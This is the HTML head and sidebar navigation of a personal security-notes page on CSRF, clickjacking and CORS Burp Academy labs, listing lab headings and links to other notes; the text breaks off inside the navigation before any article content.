
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
        <link rel="prev" href="../Business%20Logic%20Vulnerabilities/">
      
      
        <link rel="next" href="../Cross%20Site%20Scripting/">
      
      
      <link rel="icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.4.8">
    
    
      
        <title>CSRF, Clickjacking and CORS - irboi746's space</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.4b4a2bd9.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.356b1318.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="deep-orange">
  
    
    
      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#csrf-clickjacking-and-cors" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../.." title="irboi746&#39;s space" class="md-header__button md-logo" aria-label="irboi746's space" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            irboi746's space
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              CSRF, Clickjacking and CORS
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="deep-orange"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="blue-grey" data-md-color-accent="deep-orange"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3Z"/></svg>
      </label>
    
  
</form>
      
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="irboi746&#39;s space" class="md-nav__button md-logo" aria-label="irboi746's space" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    irboi746's space
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Welcome
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Burp Academy
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Burp Academy
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" checked>
        
          
          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Apprentice
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2_1">
            <span class="md-nav__icon md-icon"></span>
            Apprentice
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../Access%20Control%20Vulnerabilities/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Access Control Vulnerabilities
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../Authentication/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Authentication
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../Business%20Logic%20Vulnerabilities/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Business Logic Vulnerabilities
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    CSRF, Clickjacking and CORS
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    CSRF, Clickjacking and CORS
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#csrf-vulnerability-with-no-defenses" class="md-nav__link">
    CSRF vulnerability with no defenses
  </a>
  
    <nav class="md-nav" aria-label="CSRF vulnerability with no defenses">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumeration" class="md-nav__link">
    Enumeration
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vulnerability-assessment" class="md-nav__link">
    Vulnerability Assessment
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#basic-clickjacking-with-csrf-token-protection" class="md-nav__link">
    Basic clickjacking with CSRF token protection
  </a>
  
    <nav class="md-nav" aria-label="Basic clickjacking with CSRF token protection">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumeration_1" class="md-nav__link">
    Enumeration
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploitation" class="md-nav__link">
    Exploitation
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#clickjacking-with-form-input-data-prefilled-from-a-url-parameter" class="md-nav__link">
    Clickjacking with form input data prefilled from a URL parameter
  </a>
  
    <nav class="md-nav" aria-label="Clickjacking with form input data prefilled from a URL parameter">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumeration_2" class="md-nav__link">
    Enumeration
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploitation_1" class="md-nav__link">
    Exploitation
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#clickjacking-with-a-frame-buster-script" class="md-nav__link">
    Clickjacking with a frame buster script
  </a>
  
    <nav class="md-nav" aria-label="Clickjacking with a frame buster script">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumeration_3" class="md-nav__link">
    Enumeration
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploitation_2" class="md-nav__link">
    Exploitation
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#cors-vulnerability-with-basic-origin-reflection" class="md-nav__link">
    CORS vulnerability with basic origin reflection
  </a>
  
    <nav class="md-nav" aria-label="CORS vulnerability with basic origin reflection">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumeration_4" class="md-nav__link">
    Enumeration
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vulnerability-assessment-exploitation" class="md-nav__link">
    Vulnerability Assessment / Exploitation
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#cors-vulnerability-with-trusted-null-origin" class="md-nav__link">
    CORS vulnerability with trusted null origin
  </a>
  
    <nav class="md-nav" aria-label="CORS vulnerability with trusted null origin">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumeration_5" class="md-nav__link">
    Enumeration
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vulnerability-assessment-exploitation_1" class="md-nav__link">
    Vulnerability Assessment / Exploitation
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../Cross%20Site%20Scripting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cross Site Scripting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../DOM-based%20XSS/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DOM based XSS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../HTTP%20Host%20Header%20Attacks%20and%20File%20Upload%20Vulnerabilities/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTTP Host Header Attacks & File Upload Vulnerabilities
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../Information%20Disclosure/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Information Disclosure
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../JWT/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    JWT
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../Other%20Labs/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Other Labs
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../SQL%20Injection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SQL Injection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../XXE%20and%20SSRF/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    XXE and SSRF
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
        
          
          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Practitioner
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2">
            <span class="md-nav__icon md-icon"></span>
            Practitioner
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../Practitioner/SQL%20Injection%20DB%20Enumeration/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SQL Injection DB Enumeration
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../Practitioner/SQL%20Injection%20UNION%20Attack/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SQL Injection UNION Attack
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    CTF
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            CTF
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../CTF/TISC%202022%20%281%29/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CSIT TISC 2022 (1)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../CTF/TISC%202022%20%282%29/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CSIT TISC 2022 (2)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
        
          
          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Flareon22
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_3">
            <span class="md-nav__icon md-icon"></span>
            Flareon22
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../CTF/Flareon22/FlareOn_22/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Flareon-22
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Dev
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Dev
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_1" >
        
          
          <label class="md-nav__link" for="__nav_4_1" id="__nav_4_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Java
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4_1">
            <span class="md-nav__icon md-icon"></span>
            Java
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../Dev/Java/Burp%20Extension%20-%20GUI/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Burp Extension - GUI
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../Dev/Java/Burp%20Extension%20-%20Hello%20World/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Burp Extension - Hello World
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../Dev/Java/Burp%20Extension%20-%20README/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Burp Extension   README
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" >
        
          
          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Javascript
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4_2">
            <span class="md-nav__icon md-icon"></span>
            Javascript
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../Dev/Javascript/Node.js/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Node.js
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../Dev/Javascript/Node.js_Projects/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    NodeJS Projects
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3" >
        
          
          <label class="md-nav__link" for="__nav_4_3" id="__nav_4_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Python
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4_3">
            <span class="md-nav__icon md-icon"></span>
            Python
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../Dev/Python/Web%20Automation%20Cheatsheet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Web Automation Cheatsheet
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Malware Analysis
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            Malware Analysis
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_1" >
        
          
          <label class="md-nav__link" for="__nav_5_1" id="__nav_5_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Notes
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_1">
            <span class="md-nav__icon md-icon"></span>
            Notes
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../Malware_Analysis/Notes/File_Identification%26Classification/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    File Identification and Classification
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../Malware_Analysis/Notes/Introduction/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Introduction
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows Obfuscation Techniques
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2" >
        
          
          <label class="md-nav__link" for="__nav_5_2" id="__nav_5_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Practical Malware Analysis
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_2">
            <span class="md-nav__icon md-icon"></span>
            Practical Malware Analysis
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../Malware_Analysis/Practical_Malware_Analysis/Chapter%200/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chapter 0
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../Malware_Analysis/Practical_Malware_Analysis/Chapter%201/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chapter 1
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../Malware_Analysis/Practical_Malware_Analysis/Chapter%203/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chapter 3
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
        
          
          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    OWASP Labs
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6">
            <span class="md-nav__icon md-icon"></span>
            OWASP Labs
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../OWASP_Labs/Generic%20University/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Generic University
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../OWASP_Labs/crAPI/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    crAPI
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
        
          
          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    PG
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7">
            <span class="md-nav__icon md-icon"></span>
            PG
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../PG/Linux%20-%20Cassios/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cassios
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
        
          
          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    RE101
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8">
            <span class="md-nav__icon md-icon"></span>
            RE101
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../RE101/3.%20Simple%20Lambdas/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    3. Simple Lambdas
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
